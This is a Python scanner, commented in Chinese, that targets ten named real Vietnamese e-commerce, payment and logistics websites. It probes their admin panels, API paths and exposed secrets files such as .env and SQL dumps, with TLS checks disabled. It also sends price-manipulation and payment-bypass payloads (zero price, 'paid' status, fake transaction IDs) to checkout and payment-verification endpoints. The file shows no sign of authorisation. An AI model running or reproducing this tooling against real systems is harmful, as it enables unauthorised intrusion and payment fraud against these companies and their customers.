#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
简化进阶越南目标扫描器
Simple Advanced Vietnam Target Scanner

对越南高价值目标进行安全测试
"""

import requests
import json
import time
from datetime import datetime
from urllib.parse import urljoin
import threading

# 禁用SSL警告
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SimpleAdvancedScanner:
    """简化进阶扫描器"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.session.verify = False
        self.results = []
        self.lock = threading.Lock()

    def get_high_value_targets(self):
        """获取高价值目标列表"""
        return [
            {"url": "https://shopee.vn", "category": "ecommerce", "name": "Shopee Vietnam"},
            {"url": "https://momo.vn", "category": "payment", "name": "MoMo Wallet"},
            {"url": "https://zalopay.vn", "category": "payment", "name": "ZaloPay"},
            {"url": "https://tiki.vn", "category": "ecommerce", "name": "Tiki"},
            {"url": "https://lazada.vn", "category": "ecommerce", "name": "Lazada Vietnam"},
            {"url": "https://viettelpost.vn", "category": "logistics", "name": "Viettel Post"},
            {"url": "https://vnpost.vn", "category": "logistics", "name": "VNPost"},
            {"url": "https://giaohangnhanh.vn", "category": "logistics", "name": "Giao Hang Nhanh"},
            {"url": "https://ghtk.vn", "category": "logistics", "name": "GHTK"},
            {"url": "https://vnpay.vn", "category": "payment", "name": "VNPay"}
        ]

    def test_admin_panel(self, target):
        """测试管理后台"""
        vulns = []
        admin_paths = [
            "/admin", "/administrator", "/wp-admin", "/wp-login.php",
            "/login", "/dashboard", "/backend", "/control", "/manage",
            "/panel", "/cms", "/cpanel", "/admin.php", "/admin/login"
        ]

        for path in admin_paths:
            try:
                url = f"{target['url']}{path}"
                response = self.session.get(url, timeout=10)

                if response.status_code in [200, 401, 403]:
                    content = response.text.lower()
                    admin_indicators = ["admin", "dashboard", "login", "password", "username"]

                    if any(indicator in content for indicator in admin_indicators) or response.status_code == 401:
                        vulns.append({
                            "type": "admin_panel",
                            "url": url,
                            "status": response.status_code,
                            "severity": "High" if response.status_code == 200 else "Medium"
                        })
                        print(f"   [ADMIN] 发现管理后台: {url} ({response.status_code})")
            except:
                continue

        return vulns

    def test_api_endpoints(self, target):
        """测试API端点"""
        vulns = []
        api_paths = ["/api", "/api/v1", "/api/v2", "/rest", "/webapi", "/service"]

        for path in api_paths:
            try:
                url = f"{target['url']}{path}"
                response = self.session.get(url, timeout=10)

                if response.status_code == 200:
                    content = response.text

                    # 检查敏感信息泄露
                    sensitive_patterns = ["password", "token", "key", "secret", "admin", "debug"]
                    for pattern in sensitive_patterns:
                        if pattern in content.lower():
                            vulns.append({
                                "type": "api_exposure",
                                "url": url,
                                "status": response.status_code,
                                "severity": "High",
                                "pattern": pattern
                            })
                            print(f"   [API] 发现信息泄露: {url}")
                            break
            except:
                continue

        return vulns

    def test_vulnerabilities(self, target):
        """测试基础漏洞"""
        vulns = []

        # 测试常见漏洞
        test_paths = [
            "/phpinfo.php",
            "/info.php",
            "/test.php",
            "/config.php",
            "/.env",
            "/backup.sql",
            "/dump.sql"
        ]

        for path in test_paths:
            try:
                url = f"{target['url']}{path}"
                response = self.session.get(url, timeout=10)

                if response.status_code == 200:
                    content = response.text

                    if "phpinfo" in content.lower() or "php version" in content.lower():
                        vulns.append({
                            "type": "information_disclosure",
                            "url": url,
                            "severity": "Medium"
                        })
                        print(f"   [INFO] 信息泄露: {url}")

                    elif "password" in content.lower() or "secret" in content.lower():
                        vulns.append({
                            "type": "sensitive_data",
                            "url": url,
                            "severity": "High"
                        })
                        print(f"   [DATA] 敏感数据: {url}")
            except:
                continue

        return vulns

    def test_business_logic(self, target):
        """测试业务逻辑漏洞"""
        vulns = []

        if target['category'] == 'ecommerce':
            # 测试价格操纵
            test_payloads = [
                {"price": 0, "quantity": 1},
                {"total": 1, "original": 1000000}
            ]

            test_urls = [
                f"{target['url']}/api/cart",
                f"{target['url']}/api/checkout",
                f"{target['url']}/api/order"
            ]

            for url in test_urls:
                for payload in test_payloads:
                    try:
                        response = self.session.post(url, json=payload, timeout=10)
                        if response.status_code == 200:
                            try:
                                result = response.json()
                                if result.get('success') or result.get('total', 999999) < 1000:
                                    vulns.append({
                                        "type": "price_manipulation",
                                        "url": url,
                                        "payload": payload,
                                        "severity": "Critical"
                                    })
                                    print(f"   [BUSINESS] 价格操纵: {url}")
                            except:
                                pass
                    except:
                        continue

        elif target['category'] == 'payment':
            # 测试支付绕过
            test_payloads = [
                {"amount": 0, "status": "paid"},
                {"transaction_id": "fake_123", "verified": True}
            ]

            test_urls = [
                f"{target['url']}/api/payment/verify",
                f"{target['url']}/api/transaction"
            ]

            for url in test_urls:
                for payload in test_payloads:
                    try:
                        response = self.session.post(url, json=payload, timeout=10)
                        if response.status_code == 200:
                            try:
                                result = response.json()
                                if result.get('verified') or result.get('success'):
                                    vulns.append({
                                        "type": "payment_bypass",
                                        "url": url,
                                        "payload": payload,
                                        "severity": "Critical"
                                    })
                                    print(f"   [PAYMENT] 支付绕过: {url}")
                            except:
                                pass
                    except:
                        continue

        return vulns

    def scan_target(self, target):
        """扫描单个目标"""
        print(f"\n[SCAN] 扫描目标: {target['name']} ({target['url']})")

        result = {
            "target": target,
            "scan_start": datetime.now().isoformat(),
            "vulnerabilities": [],
            "accessible": False
        }

        try:
            # 基础连通性测试
            response = self.session.get(target['url'], timeout=15)
            if response.status_code == 200:
                result["accessible"] = True
                result["status_code"] = response.status_code
                print(f"   [OK] 目标可访问 ({response.status_code})")

                # 执行各种测试
                print("   [TEST] 管理后台检测...")
                admin_vulns = self.test_admin_panel(target)
                result["vulnerabilities"].extend(admin_vulns)

                print("   [TEST] API端点检测...")
                api_vulns = self.test_api_endpoints(target)
                result["vulnerabilities"].extend(api_vulns)

                print("   [TEST] 基础漏洞检测...")
                basic_vulns = self.test_vulnerabilities(target)
                result["vulnerabilities"].extend(basic_vulns)

                print("   [TEST] 业务逻辑检测...")
                business_vulns = self.test_business_logic(target)
                result["vulnerabilities"].extend(business_vulns)

            else:
                print(f"   [FAIL] 目标不可访问 ({response.status_code})")
                result["status_code"] = response.status_code

        except Exception as e:
            print(f"   [ERROR] 扫描失败: {str(e)[:50]}")
            result["error"] = str(e)

        result["scan_end"] = datetime.now().isoformat()
        result["total_vulnerabilities"] = len(result["vulnerabilities"])
        result["critical_count"] = len([v for v in result["vulnerabilities"] if v.get("severity") == "Critical"])
        result["high_count"] = len([v for v in result["vulnerabilities"] if v.get("severity") == "High"])

        with self.lock:
            self.results.append(result)

        print(f"   [DONE] 扫描完成 - 发现 {result['total_vulnerabilities']} 个漏洞")
        return result

    def scan_all_targets(self):
        """扫描所有目标"""
        targets = self.get_high_value_targets()

        print("进阶越南目标扫描器")
        print("深度安全测试与漏洞验证")
        print("=" * 50)
        print(f"总目标数: {len(targets)}")
        print()

        # 串行扫描避免被封锁
        for target in targets:
            self.scan_target(target)
            time.sleep(2)  # 间隔2秒

        return self.results

    def generate_report(self, results):
        """生成扫描报告"""
        total_targets = len(results)
        accessible = len([r for r in results if r.get("accessible")])
        total_vulns = sum(r.get("total_vulnerabilities", 0) for r in results)
        critical_vulns = sum(r.get("critical_count", 0) for r in results)
        high_vulns = sum(r.get("high_count", 0) for r in results)

        print("\n" + "=" * 60)
        print("扫描结果统计")
        print("=" * 60)
        print(f"总目标数: {total_targets}")
        print(f"可访问: {accessible}")
        print(f"总漏洞数: {total_vulns}")
        print(f"严重漏洞: {critical_vulns}")
        print(f"高危漏洞: {high_vulns}")

        # 显示有漏洞的目标
        vuln_targets = [r for r in results if r.get("total_vulnerabilities", 0) > 0]

        if vuln_targets:
            print(f"\n发现漏洞的目标 ({len(vuln_targets)} 个):")
            print("-" * 60)

            for result in vuln_targets:
                target = result["target"]
                vulns = result["vulnerabilities"]
                print(f"\n{target['name']} ({target['category']})")
                print(f"  URL: {target['url']}")
                print(f"  漏洞数: {len(vulns)}")

                # 按严重程度分组
                critical = [v for v in vulns if v.get("severity") == "Critical"]
                high = [v for v in vulns if v.get("severity") == "High"]
                medium = [v for v in vulns if v.get("severity") == "Medium"]

                if critical:
                    print(f"  严重漏洞 ({len(critical)} 个):")
                    for vuln in critical:
                        print(f"    • {vuln['type']}: {vuln.get('url', 'N/A')}")

                if high:
                    print(f"  高危漏洞 ({len(high)} 个):")
                    for vuln in high:
                        print(f"    • {vuln['type']}: {vuln.get('url', 'N/A')}")

                if medium:
                    print(f"  中危漏洞 ({len(medium)} 个):")
                    for vuln in medium:
                        print(f"    • {vuln['type']}: {vuln.get('url', 'N/A')}")

        # 导出详细结果
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"vietnam_advanced_scan_report_{timestamp}.json"

        report_data = {
            "scan_info": {
                "timestamp": datetime.now().isoformat(),
                "total_targets": total_targets,
                "accessible": accessible,
                "total_vulnerabilities": total_vulns,
                "critical_vulnerabilities": critical_vulns,
                "high_vulnerabilities": high_vulns
            },
            "results": results
        }

        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report_data, f, ensure_ascii=False, indent=2)

        print(f"\n详细报告已保存到: {report_file}")
        return report_file

def main():
    """主程序"""
    scanner = SimpleAdvancedScanner()

    # 扫描所有目标
    results = scanner.scan_all_targets()

    # 生成报告
    report_file = scanner.generate_report(results)

    # 总结
    critical_targets = [r for r in results if r.get("critical_count", 0) > 0]
    high_targets = [r for r in results if r.get("high_count", 0) > 0]

    print(f"\n重点关注:")
    if critical_targets:
        print(f"  严重漏洞目标: {len(critical_targets)} 个")
        for target in critical_targets:
            print(f"    • {target['target']['name']}")

    if high_targets:
        print(f"  高危漏洞目标: {len(high_targets)} 个")
        for target in high_targets:
            print(f"    • {target['target']['name']}")

    print(f"\n扫描完成! 报告文件: {report_file}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n扫描被用户中断")
    except Exception as e:
        print(f"\n扫描出错: {e}")